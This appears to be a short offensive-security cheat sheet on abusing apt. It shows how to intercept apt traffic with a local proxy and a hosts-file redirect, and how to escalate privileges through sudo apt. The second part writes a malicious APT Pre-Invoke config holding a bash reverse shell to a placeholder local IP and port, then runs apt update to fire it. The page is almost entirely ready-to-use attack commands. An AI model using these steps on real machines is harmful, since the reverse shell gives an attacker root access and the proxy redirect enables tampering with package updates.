---
title: "Apt"
date: 2024-7-4
tags: ["apt", "update", "privesc", "pre-invoke", "sudo"]
---

### MITM (Man-in-the-Middle)

#### 1. Add proxy path in target machine

```console
export http_proxy=http://<LOCAL_IP>:<LOCAL_PROXY_PORT>
```

#### 2. Start proxy in local machine

```console
# Tool
pip3 install --upgrade proxy.py
```

```console
# Start a proxy server
proxy --hostname 0.0.0.0 --port <LOCAL_PROXY_PORT>
```

#### 3. Redirect traffic to our server

```console
# Edit /etc/hosts in target machine
<LOCAL_IP> apt.update.example.com
```

---

### SUDO

#### 1. Create a malicious config

```console
echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
```

#### 2. Exploit

```console
sudo apt update -y
```

<br>